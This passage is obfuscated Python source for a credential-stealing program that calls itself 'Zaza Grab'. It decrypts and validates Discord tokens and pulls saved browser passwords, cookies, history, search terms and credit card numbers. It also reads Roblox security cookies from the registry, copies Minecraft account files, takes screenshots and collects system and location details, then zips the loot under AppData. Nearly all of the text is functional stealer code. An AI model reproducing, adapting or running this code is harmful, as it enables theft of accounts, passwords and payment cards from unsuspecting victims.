Data\\Default\\Local Storage\\leveldb\\'}#line:565
        for O0OOOOO0OOOO0OO0O ,O00OO0O0OO0O00000 in OO0OO0O00O0000O0O .items ():#line:567
            if not os .path .exists (O00OO0O0OO0O00000 ):#line:568
                continue #line:569
            O00O0OO0OO00OOOOO =O0OOOOO0OOOO0OO0O .replace (" ","").lower ()#line:570
            if "cord"in O00OO0O0OO0O00000 :#line:571
                if os .path .exists (O00OO00OOOO0OO0O0 .roaming +f'\\{O00O0OO0OO00OOOOO}\\Local State'):#line:572
                    for O0OOO0000O0OO0OO0 in os .listdir (O00OO0O0OO0O00000 ):#line:573
                        if O0OOO0000O0OO0OO0 [-3 :]not in ["log","ldb"]:#line:574
                            continue #line:575
                        for OOOO0O00OOOOOO00O in [O0O00O0O0O0O0O00O .strip ()for O0O00O0O0O0O0O00O in open (f'{O00OO0O0OO0O00000}\\{O0OOO0000O0OO0OO0}',errors ='ignore').readlines ()if O0O00O0O0O0O0O00O .strip ()]:#line:576
                            for O00OO0O00000000OO in re .findall (O00OO00OOOO0OO0O0 .encrypted_regex ,OOOO0O00OOOOOO00O ):#line:577
                                try :#line:578
                                    O000OOO0O0OO00OOO =O00OO00OOOO0OO0O0 .decrypt_val (base64 .b64decode (O00OO0O00000000OO .split ('dQw4w9WgXcQ:')[1 ]),O00OO00OOOO0OO0O0 .get_master_key (O00OO00OOOO0OO0O0 .roaming +f'\\{O00O0OO0OO00OOOOO}\\Local State'))#line:579
                                except ValueError :#line:580
                                    pass #line:581
                                try :#line:582
                                    OO0OO0000O000OO0O =requests .get (O00OO00OOOO0OO0O0 .baseurl ,headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type':'application/json','Authorization':O000OOO0O0OO00OOO })#line:586
                                except Exception :#line:587
                                    pass #line:588
                                if OO0OO0000O000OO0O .status_code ==200 :#line:589
                                    OO000OO0O00O0O00O =OO0OO0000O000OO0O .json ()['id']#line:590
                                    if OO000OO0O00O0O00O not in O00OO00OOOO0OO0O0 .ids :#line:591
                                        O00OO00OOOO0OO0O0 .tokens .append (O000OOO0O0OO00OOO )#line:592
                                        O00OO00OOOO0OO0O0 .ids .append (OO000OO0O00O0O00O )#line:593
            else :#line:594
                for O0OOO0000O0OO0OO0 in os .listdir (O00OO0O0OO0O00000 ):#line:595
                    if O0OOO0000O0OO0OO0 [-3 :]not in ["log","ldb"]:#line:596
                        continue #line:597
                    for OOOO0O00OOOOOO00O in [O0O000O00OO0000OO .strip ()for O0O000O00OO0000OO in open (f'{O00OO0O0OO0O00000}\\{O0OOO0000O0OO0OO0}',errors ='ignore').readlines ()if O0O000O00OO0000OO .strip ()]:#line:598
                        for O000OOO0O0OO00OOO in re .findall (O00OO00OOOO0OO0O0 .regex ,OOOO0O00OOOOOO00O ):#line:599
                            try :#line:600
                                OO0OO0000O000OO0O =requests .get (O00OO00OOOO0OO0O0 .baseurl ,headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type':'application/json','Authorization':O000OOO0O0OO00OOO })#line:604
                            except Exception :#line:605
                                pass #line:606
                            if OO0OO0000O000OO0O .status_code ==200 :#line:607
                                OO000OO0O00O0O00O =OO0OO0000O000OO0O .json ()['id']#line:608
                                if OO000OO0O00O0O00O not in O00OO00OOOO0OO0O0 .ids :#line:609
                                    O00OO00OOOO0OO0O0 .tokens .append (O000OOO0O0OO00OOO )#line:610
                                    O00OO00OOOO0OO0O0 .ids .append (OO000OO0O00O0O00O )#line:611
        if os .path .exists (O00OO00OOOO0OO0O0 .roaming +"\\Mozilla\\Firefox\\Profiles"):#line:613
            for O00OO0O0OO0O00000 ,_OO00O0OO0O000OOO0 ,OO0OOOO0OO00OOOOO in os .walk (O00OO00OOOO0OO0O0 .roaming +"\\Mozilla\\Firefox\\Profiles"):#line:614
                for _O0O0000OO00OO00OO in OO0OOOO0OO00OOOOO :#line:615
                    if not _O0O0000OO00OO00OO .endswith ('.sqlite'):#line:616
                        continue #line:617
                    for OOOO0O00OOOOOO00O in [OOO0OOOOOO000OO0O .strip ()for OOO0OOOOOO000OO0O in open (f'{O00OO0O0OO0O00000}\\{_O0O0000OO00OO00OO}',errors ='ignore').readlines ()if OOO0OOOOOO000OO0O .strip ()]:#line:618
                        for O000OOO0O0OO00OOO in re .findall (O00OO00OOOO0OO0O0 .regex ,OOOO0O00OOOOOO00O ):#line:619
                            try :#line:620
                                OO0OO0000O000OO0O =requests .get (O00OO00OOOO0OO0O0 .baseurl ,headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type':'application/json','Authorization':O000OOO0O0OO00OOO })#line:624
                            except Exception :#line:625
                                pass #line:626
                            if OO0OO0000O000OO0O .status_code ==200 :#line:627
                                OO000OO0O00O0O00O =OO0OO0000O000OO0O .json ()['id']#line:628
                                if OO000OO0O00O0O00O not in O00OO00OOOO0OO0O0 .ids :#line:629
                                    O00OO00OOOO0OO0O0 .tokens .append (O000OOO0O0OO00OOO )#line:630
                                    O00OO00OOOO0OO0O0 .ids .append (OO000OO0O00O0O00O )#line:631
    def randomdircreator (OO0O000O00O0O0O00 ,_dir :str or os .PathLike =gettempdir ()):#line:639
        OO0O0OOO00OOO0O00 =''.join (random .SystemRandom ().choice ('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')for _O000OO00OOOOO0000 in range (random .randint (10 ,20 )))#line:640
        OOO0O0OO0O00OO0O0 =os .path .join (_dir ,OO0O0OOO00OOO0O00 )#line:641
        open (OOO0O0OO0O00OO0O0 ,"x")#line:642
        return OOO0O0OO0O00OO0O0 #line:643
    @trexctrac #line:646
    def grbpsw2 (OO0O00OOOOO000O00 ,OO00O0O0O00OOO000 :str ,O00O000000OO0O0O0 :str ,OOOOOO0O00000OOO0 :str ):#line:647
        O00O000000OO0O0O0 +='\\'+OOOOOO0O00000OOO0 +'\\Login Data'#line:648
        if not os .path .isfile (O00O000000OO0O0O0 ):#line:649
            return #line:650
        O00OO0O0O0OOO0000 =OO0O00OOOOO000O00 .randomdircreator ()#line:652
        copy2 (O00O000000OO0O0O0 ,O00OO0O0O0OOO0000 )#line:653
        O00O000000OO0O0OO =sqlite3 .connect (O00OO0O0O0OOO0000 )#line:654
        O0O0O00OOOOO000OO =O00O000000OO0O0OO .cursor ()#line:655
        with open (os .path .join (OO0O00OOOOO000O00 .dir ,"Browsers","All Passwords.txt"),'a',encoding ="utf-8")as OOOO0O0O00OO0O000 :#line:656
            for O00000OOO0OOOOOO0 in O0O0O00OOOOO000OO .execute ("SELECT origin_url, username_value, password_value FROM logins").fetchall ():#line:657
                OOO0O0O000O0O0OO0 ,O00OO000000O00OO0 ,OOO0O00O0OOOO00OO =O00000OOO0OOOOOO0 #line:658
                OOO0O00O0OOOO00OO =OO0O00OOOOO000O00 .dcrpt_val (OOO0O00O0OOOO00OO ,OO0O00OOOOO000O00 .masterkey )#line:659
                if OOO0O0O000O0O0OO0 !="":#line:660
                    OOOO0O0O00OO0O000 .write (f"URL: {OOO0O0O000O0O0OO0}\nID: {O00OO000000O00OO0}\nPASSW0RD: {OOO0O00O0OOOO00OO}\n\n")#line:661
        O0O0O00OOOOO000OO .close ()#line:662
        O00O000000OO0O0OO .close ()#line:663
        os .remove (O00OO0O0O0OOO0000 )#line:664
    @trexctrac #line:666
    def grbcook (O00O0OOO0000OOO0O ,OO0O0O000000OO000 :str ,O00OO000O00O0O0O0 :str ,O0O0O0O0OO0OO0OO0 :str ):#line:667
        O00OO000O00O0O0O0 +='\\'+O0O0O0O0OO0OO0OO0 +'\\Network\\Cookies'#line:668
        if not os .path .isfile (O00OO000O00O0O0O0 ):#line:669
            return #line:670
        OOOOOOOOOO000O0OO =O00O0OOO0000OOO0O .randomdircreator ()#line:671
        copy2 (O00OO000O00O0O0O0 ,OOOOOOOOOO000O0OO )#line:672
        OO0000OO000OO00OO =sqlite3 .connect (OOOOOOOOOO000O0OO )#line:673
        OO00000O000OO0OOO =OO0000OO000OO00OO .cursor ()#line:674
        with open (os .path .join (O00O0OOO0000OOO0O .dir ,"Browsers","All Cookies.txt"),'a',encoding ="utf-8")as O00O0O00O0O0OOOO0 :#line:675
            for O0OOOOOOOOOO0O0OO in OO00000O000OO0OOO .execute ("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall ():#line:676
                O00OO00OO00O000O0 ,OO0O0O000000OO000 ,O00OO000O00O0O0O0 ,OO0000OOOOO0O00O0 ,O0000OOOOO0OOOOOO =O0OOOOOOOOOO0O0OO #line:677
                O000000OO000OO00O =O00O0OOO0000OOO0O .dcrpt_val (OO0000OOOOO0O00O0 ,O00O0OOO0000OOO0O .masterkey )#line:678
                if O00OO00OO00O000O0 and OO0O0O000000OO000 and O000000OO000OO00O !="":#line:679
                    O00O0O00O0O0OOOO0 .write ("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format (O00OO00OO00O000O0 ,'FALSE'if O0000OOOOO0OOOOOO ==0 else 'TRUE',O00OO000O00O0O0O0 ,'FALSE'if O00OO00OO00O000O0 .startswith ('.')else 'TRUE',O0000OOOOO0OOOOOO ,OO0O0O000000OO000 ,O000000OO000OO00O ))#line:681
        OO00000O000OO0OOO .close ()#line:682
        OO0000OO000OO00OO .close ()#line:683
        os .remove (OOOOOOOOOO000O0OO )#line:684
    @trexctrac #line:693
    def grbpsw (OOO000O0OOO0O0OO0 ):#line:694
        OOOOOO00O0OOO000O =open (ntpath .join (OOO000O0OOO0O0OO0 .dir ,'Google','Passwords.txt'),'w',encoding ="cp437",errors ='ignore')#line:695
        for OO0000OO0OOOOOO00 in os .listdir (OOO000O0OOO0O0OO0 .chrmmuserdtt ):#line:696
            if re .match (OOO000O0OOO0O0OO0 .chrmrgx ,OO0000OO0OOOOOO00 ):#line:697
                O000OO00O00O0O000 =ntpath .join (OOO000O0OOO0O0OO0 .chrmmuserdtt ,OO0000OO0OOOOOO00 ,'Login Data')#line:698
                OO0O0OO0OOO0O0O0O =OOO000O0OOO0O0OO0 .cr34t3_f1lkes ()#line:699
                shutil .copy2 (O000OO00O00O0O000 ,OO0O0OO0OOO0O0O0O )#line:701
                O000O000OOOO0O000 =sqlite3 .connect (OO0O0OO0OOO0O0O0O )#line:702
                OOOO000000OO0O00O =O000O000OOOO0O000 .cursor ()#line:703
                OOOO000000OO0O00O .execute ("SELECT action_url, username_value, password_value FROM logins")#line:704
                for OOO00O00000000O00 in OOOO000000OO0O00O .fetchall ():#line:706
                    O0O0O0OOOOO00OO0O =OOO00O00000000O00 [0 ]#line:707
                    OO00OO000O00O0OO0 =OOO00O00000000O00 [1 ]#line:708
                    O0OO0O0OO00OOO0O0 =OOO00O00000000O00 [2 ]#line:709
                    O00OOO0OOO000O0O0 =OOO000O0OOO0O0OO0 .dcrpt_val (O0OO0O0OO00OOO0O0 ,OOO000O0OOO0O0OO0 .chrome_key )#line:710
                    if O0O0O0OOOOO00OO0O !="":#line:711
                        OOOOOO00O0OOO000O .write (f"URL: {O0O0O0OOOOO00OO0O}\nID: {OO00OO000O00O0OO0}\nPASSW0RD: {O00OOO0OOO000O0O0}\n\n")#line:712
                OOOO000000OO0O00O .close ()#line:714
                O000O000OOOO0O000 .close ()#line:715
                os .remove (OO0O0OO0OOO0O0O0O )#line:716
        OOOOOO00O0OOO000O .close ()#line:717
    @trexctrac #line:721
    def grbcoke (O00O0O00O0O0OO0O0 ):#line:722
        O00O000O0OOO00000 =open (ntpath .join (O00O0O00O0O0OO0O0 .dir ,'Google','Cookies.txt'),'w',encoding ="cp437",errors ='ignore')#line:723
        for OOOOO0OO00000O00O in os .listdir (O00O0O00O0O0OO0O0 .chrmmuserdtt ):#line:724
            if re .match (O00O0O00O0O0OO0O0 .chrmrgx ,OOOOO0OO00000O00O ):#line:726
                OO0O0O00OO0O0O00O =ntpath .join (O00O0O00O0O0OO0O0 .chrmmuserdtt ,OOOOO0OO00000O00O ,'Network','cookies')#line:728
                O0OO0O0O0OO0O0000 =O00O0O00O0O0OO0O0 .cr34t3_f1lkes ()#line:729
                shutil .copy2 (OO0O0O00OO0O0O00O ,O0OO0O0O0OO0O0000 )#line:732
                OOO000OOO00000O00 =sqlite3 .connect (O0OO0O0O0OO0O0000 )#line:733
                O000000OO0O0000O0 =OOO000OOO00000O00 .cursor ()#line:734
                O000000OO0O0000O0 .execute ("SELECT host_key, name, encrypted_value from cookies")#line:735
                for O00O0O0O00O00O0O0 in O000000OO0O0000O0 .fetchall ():#line:737
                    OOOO000OOO0O000OO =O00O0O0O00O00O0O0 [0 ]#line:738
                    OOOOO00000OO00O00 =O00O0O0O00O00O0O0 [1 ]#line:739
                    OOO0O0OOOOO00O0O0 =O00O0O00O0O0OO0O0 .dcrpt_val (O00O0O0O00O00O0O0 [2 ],O00O0O00O0O0OO0O0 .chrome_key )#line:740
                    if OOOO000OOO0O000OO !="":#line:741
                        O00O000O0OOO00000 .write (f"HOST KEY: {OOOO000OOO0O000OO} | NAME: {OOOOO00000OO00O00} | VALUE: {OOO0O0OOOOO00O0O0}\n")#line:742
                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'in OOO0O0OOOOO00O0O0 :#line:743
                        O00O0O00O0O0OO0O0 .robloxcookies .append (OOO0O0OOOOO00O0O0 )#line:744
                O000000OO0O0000O0 .close ()#line:746
                OOO000OOO00000O00 .close ()#line:747
                os .remove (O0OO0O0O0OO0O0000 )#line:748
        O00O000O0OOO00000 .close ()#line:749
    def gethistez (O00OO0OO0000O0O0O ,O00O00OO000OOO0OO :str ,O00OOOOO0O00O0OOO :str ,O0OOO0000O000O0O0 :str ):#line:751
        O00OOOOO0O00O0OOO +='\\'+O0OOO0000O000O0O0 +'\\History'#line:752
        if not os .path .isfile (O00OOOOO0O00O0OOO ):#line:753
            return #line:754
        OOO0O000OOO0O00OO =O00OO0OO0000O0O0O .randomdircreator ()#line:755
        copy2 (O00OOOOO0O00O0OOO ,OOO0O000OOO0O00OO )#line:756
        OOOO0000O00O000O0 =sqlite3 .connect (OOO0O000OOO0O00OO )#line:757
        O00O00OOOOOOO0O00 =OOOO0000O00O000O0 .cursor ()#line:758
        with open (os .path .join (O00OO0OO0000O0O0O .dir ,"Browsers","All History.txt"),'a',encoding ="utf-8")as OO00O0000000OO0OO :#line:759
            O0O00OOO0OOO00O00 =[]#line:760
            for O000O0O0O0OOO0OO0 in O00O00OOOOOOO0O00 .execute ("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall ():#line:761
                O00O0000OO00O00O0 ,OO0OOO0OO000OO0OO ,O00000O0OOOO000OO ,OOO0OOO00000OOOO0 =O000O0O0O0OOO0OO0 #line:762
                if O00O0000OO00O00O0 and OO0OOO0OO000OO0OO and O00000O0OOOO000OO and OOO0OOO00000OOOO0 !="":#line:763
                    O0O00OOO0OOO00O00 .append ((O00O0000OO00O00O0 ,OO0OOO0OO000OO0OO ,O00000O0OOOO000OO ,OOO0OOO00000OOOO0 ))#line:764
            O0O00OOO0OOO00O00 .sort (key =lambda OOO0O0O0O0O00OOOO :OOO0O0O0O0O00OOOO [3 ],reverse =True )#line:765
            for O00OO00OOO0O0O00O in O0O00OOO0OOO00O00 :#line:766
                OO00O0000000OO0OO .write ("Visit Count: {:<6} Title: {:<40}\n".format (O00OO00OOO0O0O00O [2 ],O00OO00OOO0O0O00O [1 ]))#line:767
        O00O00OOOOOOO0O00 .close ()#line:768
        OOOO0000O00O000O0 .close ()#line:769
        os .remove (OOO0O000OOO0O00OO )#line:770
    def getccez (OOO0OO0OOOO0OOO0O ,O0OOO0O000O0OOOO0 :str ,O00OOO00O0O0O0000 :str ,OO0OOO00OOO0OO0O0 :str ):#line:772
        O00OOO00O0O0O0000 +='\\'+OO0OOO00OOO0OO0O0 +'\\Web Data'#line:773
        if not os .path .isfile (O00OOO00O0O0O0000 ):#line:774
            return #line:775
        O00OOO000OOO00000 =OOO0OO0OOOO0OOO0O .randomdircreator ()#line:776
        copy2 (O00OOO00O0O0O0000 ,O00OOO000OOO00000 )#line:777
        OO0OO0OO0OO0O0O0O =sqlite3 .connect (O00OOO000OOO00000 )#line:778
        OO0OO0O0O00O0O0OO =OO0OO0OO0OO0O0O0O .cursor ()#line:779
        with open (os .path .join (OOO0OO0OOOO0OOO0O .dir ,"Browsers","All Creditcards.txt"),'a',encoding ="utf-8")as O00OOO0O0OO0O00O0 :#line:780
            for O00000OO0O0O0O0OO in OO0OO0O0O00O0O0OO .execute ("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall ():#line:781
                O00O0000OOOO0000O ,O0O00O0O00OOO00OO ,OO0000O0O0O0OO000 ,OOO0OO00O000O00OO =O00000OO0O0O0O0OO #line:782
                if O00O0000OOOO0000O and OOO0OO00O000O00OO !="":#line:783
                    O00OOO0O0OO0O00O0 .write (f"Name: {O00O0000OOOO0000O}   Expiration Month: {O0O00O0O00OOO00OO}   Expiration Year: {OO0000O0O0O0OO000}   Card Number: {OOO0OO0OOOO0OOO0O.dcrpt_val(OOO0OO00O000O00OO, OOO0OO0OOOO0OOO0O.masterkey)}\n")#line:785
        O00OOO0O0OO0O00O0 .close ()#line:786
        OO0OO0O0O00O0O0OO .close ()#line:787
        OO0OO0OO0OO0O0O0O .close ()#line:788
        os .remove (O00OOO000OOO00000 )#line:789
    @trexctrac #line:792
    def grbhis (O000OOO000O00O0OO ):#line:793
        OO0O0O0O0OO000000 =open (ntpath .join (O000OOO000O00O0OO .dir ,'Google','History.txt'),'w',encoding ="cp437",errors ='ignore')#line:794
        def O0O0000OO00OO0000 (OO000OOO0O00OOOOO ):#line:796
            O00OOOO0O00OOOO00 =""#line:797
            OO000OOO0O00OOOOO .execute ('SELECT title, url, last_visit_time FROM urls')#line:798
            for OOO0000O000O000O0 in OO000OOO0O00OOOOO .fetchall ():#line:799
                O00OOOO0O00OOOO00 +=f"Search Title: {OOO0000O000O000O0[0]}\nURL: {OOO0000O000O000O0[1]}\nLAST VISIT TIME: {O000OOO000O00O0OO.cnverttim(OOO0000O000O000O0[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"#line:800
            return O00OOOO0O00OOOO00 #line:801
        def OO0O0OOO00O0OOOOO (OO0OO0O00OO0O00OO ):#line:804
            OO0OO0O00OO0O00OO .execute ('SELECT term FROM keyword_search_terms')#line:805
            O0O000O0O00000OO0 =""#line:806
            for O0O0O00O0O0O000OO in OO0OO0O00OO0O00OO .fetchall ():#line:808
                if O0O0O00O0O0O000OO [0 ]!="":#line:809
                    O0O000O0O00000OO0 +=f"{O0O0O00O0O0O000OO[0]}\n"#line:810
            return O0O000O0O00000OO0 #line:812
        for OO0O000O00OO00000 in os .listdir (O000OOO000O00O0OO .chrmmuserdtt ):#line:815
            if re .match (O000OOO000O00O0OO .chrmrgx ,OO0O000O00OO00000 ):#line:817
                OO0O000OOOO00O0OO =ntpath .join (O000OOO000O00O0OO .chrmmuserdtt ,OO0O000O00OO00000 ,'History')#line:819
                O0O00O000O000000O =O000OOO000O00O0OO .cr34t3_f1lkes ()#line:820
                shutil .copy2 (OO0O000OOOO00O0OO ,O0O00O000O000000O )#line:822
                OO0OOO0OO0O000O0O =sqlite3 .connect (O0O00O000O000000O )#line:823
                OO0OO00O000000000 =OO0OOO0OO0O000O0O .cursor ()#line:824
                O0O0OO0O0O0OOOO0O =OO0O0OOO00O0OOOOO (OO0OO00O000000000 )#line:827
                OOOO00O00OOOO0000 =O0O0000OO00OO0000 (OO0OO00O000000000 )#line:828
                OO0O0O0O0OO000000 .write (f"{' '*17}SEARCH\n{'-'*50}\n{O0O0OO0O0O0OOOO0O}\n{' '*17}\n\nLinks History\n{'-'*50}\n{OOOO00O00OOOO0000}")#line:830
                OO0OO00O000000000 .close ()#line:832
                OO0OOO0OO0O000O0O .close ()#line:833
                os .remove (O0O00O000O000000O )#line:834
        OO0O0O0O0OO000000 .close ()#line:835
    def ntfytkn (OOO000OO00OO00O0O ):#line:838
        OO00O0OO0OO0O000O =open (OOO000OO00OO00O0O .dir +"\\Discord_Info.txt","w",encoding ="cp437",errors ='ignore')#line:840
        for O0OO000O0OO00OOO0 in OOO000OO00OO00O0O .tokens :#line:842
            O0O0O0O000OO00000 =httpx .get (OOO000OO00OO00O0O .dscap1 ,headers =OOO000OO00OO00O0O .g3t_H (O0OO000O0OO00OOO0 )).json ()#line:843
            OO0OOOOOO00O000OO =O0O0O0O000OO00000 .get ('username')+'#'+str (O0O0O0O000OO00000 .get ("discriminator"))#line:844
            O00O0O0O0OO0000O0 =""#line:846
            O0000OOO000000O00 =O0O0O0O000OO00000 ['flags']#line:847
            if (O0000OOO000000O00 ==1 ):#line:848
                O00O0O0O0OO0000O0 +="Staff, "#line:849
            if (O0000OOO000000O00 ==2 ):#line:850
                O00O0O0O0OO0000O0 +="Partner, "#line:851
            if (O0000OOO000000O00 ==4 ):#line:852
                O00O0O0O0OO0000O0 +="Hypesquad Event, "#line:853
            if (O0000OOO000000O00 ==8 ):#line:854
                O00O0O0O0OO0000O0 +="Green Bughunter, "#line:855
            if (O0000OOO000000O00 ==64 ):#line:856
                O00O0O0O0OO0000O0 +="Hypesquad Bravery, "#line:857
            if (O0000OOO000000O00 ==128 ):#line:858
                O00O0O0O0OO0000O0 +="HypeSquad Brillance, "#line:859
            if (O0000OOO000000O00 ==256 ):#line:860
                O00O0O0O0OO0000O0 +="HypeSquad Balance, "#line:861
            if (O0000OOO000000O00 ==512 ):#line:862
                O00O0O0O0OO0000O0 +="Early Supporter, "#line:863
            if (O0000OOO000000O00 ==16384 ):#line:864
                O00O0O0O0OO0000O0 +="Gold BugHunter, "#line:865
            if (O0000OOO000000O00 ==131072 ):#line:866
                O00O0O0O0OO0000O0 +="Verified Bot Developer, "#line:867
            if (O0000OOO000000O00 ==4194304 ):#line:868
                O00O0O0O0OO0000O0 +="Active Developer, "#line:869
            if (O00O0O0O0OO0000O0 ==""):#line:870
                O00O0O0O0OO0000O0 ="None"#line:871
            O0O0O00OOOOOOOOO0 =O0O0O0O000OO00000 .get ("email")#line:873
            O00O0O000O0O00OO0 =O0O0O0O000OO00000 .get ("phone")if O0O0O0O000OO00000 .get ("phone")else "No Phone Number attached"#line:874
            OOO0OO00000O0O0O0 =httpx .get (OOO000OO00OO00O0O .dscap1 +'/billing/subscriptions',headers =OOO000OO00OO00O0O .g3t_H (O0OO000O0OO00OOO0 )).json ()#line:875
            O0OO0O0OOO00000O0 =False #line:876
            O0OO0O0OOO00000O0 =bool (len (OOO0OO00000O0O0O0 )>0 )#line:877
            OO0O000000OO00OOO =bool (len (json .loads (httpx .get (OOO000OO00OO00O0O .dscap1 +"/billing/payment-sources",headers =OOO000OO00OO00O0O .g3t_H (O0OO000O0OO00OOO0 )).text ))>0 )#line:878
            OO00O0OO0OO0O000O .write (f"{' '*17}{OO0OOOOOO00O000OO}\n{'-'*50}\nBilling?: {OO0O000000OO00OOO}\nNitro: {O0OO0O0OOO00000O0}\nBadges: {O00O0O0O0OO0000O0}\nPhone: {O00O0O000O0O00OO0}\nToken: {O0OO000O0OO00OOO0}\nEmail: {O0O0O00OOOOOOOOO0}\n\n")#line:881
        OO00O0OO0OO0O000O .close ()#line:882
    def grbmc (OOOO0O00000O0OO0O ):#line:885
        OO000O00O00O0O000 =ntpath .join (OOOO0O00000O0OO0O .dir ,'Minecraft')#line:886
        os .makedirs (OO000O00O00O0O000 ,exist_ok =True )#line:887
        O00OOOOO000OOOO0O =ntpath .join (OOOO0O00000O0OO0O .roaming ,'.minecraft')#line:888
        O0O0O0OOOO0OO000O =['launcher_accounts.json','launcher_profiles.json','usercache.json','launcher_log.txt']#line:891
        for _OOO0000000O00OO0O in O0O0O0OOOO0OO000O :#line:894
            if ntpath .exists (ntpath .join (O00OOOOO000OOOO0O ,_OOO0000000O00OO0O )):#line:895
                shutil .copy2 (ntpath .join (O00OOOOO000OOOO0O ,_OOO0000000O00OO0O ),OO000O00O00O0O000 +OOOO0O00000O0OO0O .sep +_OOO0000000O00OO0O )#line:896
    def grbr0blx (OOO000O000O0OO000 ):#line:900
        def OOOO00OOO0O000O00 (OOO0OOOO0OO00O0O0 ):#line:901
            try :#line:902
                return subprocess .check_output (fr"powershell Get-ItemPropertyValue -Path {OOO0OOOO0OO00O0O0}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",creationflags =0x08000000 ).decode ().rstrip ()#line:905
            except Exception :#line:906
                return None #line:907
        O0O00OOO0OO000OOO =OOOO00OOO0O000O00 (r'HKLM')#line:908
        if not O0O00OOO0OO000OOO :#line:909
            O0O00OOO0OO000OOO =OOOO00OOO0O000O00 (r'HKCU')#line:910
        if O0O00OOO0OO000OOO :#line:911
            OOO000O000O0OO000 .robloxcookies .append (O0O00OOO0OO000OOO )#line:912
        if OOO000O000O0OO000 .robloxcookies :#line:913
            with open (OOO000O000O0OO000 .dir +"\\Roblox_Cookies.txt","w")as OOOOOOO0OO00O0O0O :#line:914
                for O00O0OO00OO00O000 in OOO000O000O0OO000 .robloxcookies :#line:915
                    OOOOOOO0OO00O0O0O .write (O00O0OO00OO00O000 +'\n')#line:916
    def scrinsh (OO0OO000OO0000OO0 ):#line:918
        OOOO000OO0O0O0OO0 =ImageGrab .grab (bbox =None ,include_layered_windows =False ,all_screens =True ,xdisplay =None )#line:924
        OOOO000OO0O0O0OO0 .save (OO0OO000OO0000OO0 .dir +"\\Screenshot.png")#line:925
        OOOO000OO0O0O0OO0 .close ()#line:926
    def sysd1 (O0OOO00OO000O0O0O ):#line:928
        OOO0O0O0OO0O0O0OO =f"""
{infocom} | {vctm_pc}
Windows key: {O0OOO00OO000O0O0O.w1nk33y}
Windows version: {O0OOO00OO000O0O0O.w1nv3r}
RAM: {r4m}GB
DISK: {d1sk}GB
HWID: {O0OOO00OO000O0O0O.uuidwndz}
IP: {O0OOO00OO000O0O0O.ip}
City: {O0OOO00OO000O0O0O.city}
Country: {O0OOO00OO000O0O0O.country}
Region: {O0OOO00OO000O0O0O.region}
Org: {O0OOO00OO000O0O0O.org}
GoogleMaps: {O0OOO00OO000O0O0O.googlemap}
        """#line:942
        with open (O0OOO00OO000O0O0O .dir +"\\System_Info.txt","w",encoding ="utf-8",errors ='ignore')as OOOOOOO0O000O00O0 :#line:943
            OOOOOOO0O000O00O0 .write (OOO0O0O0OO0O0O0OO )#line:944
    def ending (OO0O00OO00OOO000O ):#line:952
        for O0O000O00O0OOO00O in os .listdir (OO0O00OO00OOO000O .dir ):#line:953
            if O0O000O00O0OOO00O .endswith ('.txt'):#line:954
                OOOO0O000O000OO00 =OO0O00OO00OOO000O .dir +OO0O00OO00OOO000O .sep +O0O000O00O0OOO00O #line:955
                with open (OOOO0O000O000OO00 ,"r",errors ="ignore")as O0O0000OOO0OO00OO :#line:956
                    OOOO0OO000O0O0O0O =O0O0000OOO0OO00OO .read ()#line:957
                    if not OOOO0OO000O0O0O0O :#line:958
                        O0O0000OOO0OO00OO .close ()#line:959
                        os .remove (OOOO0O000O000OO00 )#line:960
                    else :#line:961
                        with open (OOOO0O000O000OO00 ,"w",encoding ="utf-8",errors ="ignore")as O0OO0O0OO0O0OO000 :#line:962
                            O0OO0O0OO0O0OO000 .write ("Zaza Grab Create By Soles | https://github.com/xKrustyDemonx\n\n")#line:963
                        with open (OOOO0O000O000OO00 ,"a",encoding ="utf-8",errors ="ignore")as OO0O0OOOO0O0O00OO :#line:964
                            OO0O0OOOO0O0O00OO .write (OOOO0OO000O0O0O0O +"\n\nZaza Grab Create By Soles | https://github.com/xKrustyDemonx")#line:965
        _O00O0OO0OO000OO0O =ntpath .join (OO0O00OO00OOO000O .appdata ,f'ZG-[{infocom}].zip')#line:967
        OO000OO00O0O0OOO0 =zipfile .ZipFile (_O00O0OO0OO000OO0O ,"w",zipfile .ZIP_DEFLATED )#line:968
        OOOO0O0OOO0OO0OOO =ntpath .abspath (OO0O00OO00OOO000O .dir )#line:969
        for OO0OO0O00OOO0O0O0 ,_OO0OOO00O000O0O0O ,O00OO0OO00OO00O0O in os .walk (OO0O00OO00OOO000O .dir ):#line:970
            for OO0O00OOOOOO00O0O in O00OO0OO00OO00O0O :#line:971
                O0O0000OOO0OO0O0O =ntpath .abspath (ntpath .join (OO0OO0O00OOO0O0O0 ,OO0O00OOOOOO00O0O ))#line:972
                OOO00000OOOOO0O00 =O0O0000OOO0OO0O0O [len (OOOO0O0OOO0OO0OOO )+1 :]#line:973
                OO000OO00O0O0OOO0 .write (O0O0000OOO0OO0O0O ,OOO00000OOOOO0O00 )#line:974
        OO000OO00O0O0OOO0 .close ()#line:975
        O0O0O00OOOOO0OOOO ,O0OO00000OOO00000 ,O0O00000O0O0OO00O =0 ,'',''#line:977
        for _OO0OOO00O000O0O0O ,__ ,O00OO0OO00OO00O0O in os .walk (OO0O00OO00OOO000O .dir ):#line:978
            for _O0O000OOO000O00O0 in O00OO0OO00OO00O0O :#line:979
                O0OO00000OOO00000 +=f"・{_O0O000OOO000O00O0}\n"#line:980
                O0O0O00OOOOO0OOOO +=1 #line:981
        for OO000OO0OO0O0O00O in OO0O00OO00OOO000O .tokens :#line:982
            O0O00000O0O0OO00O +=f'{OO000OO0OO0O0O00O}\n\n'#line:983
        O0OO0OO0O0OOO0000 =f"{O0O0O00OOOOO0OOOO} Files Found: "#line:984
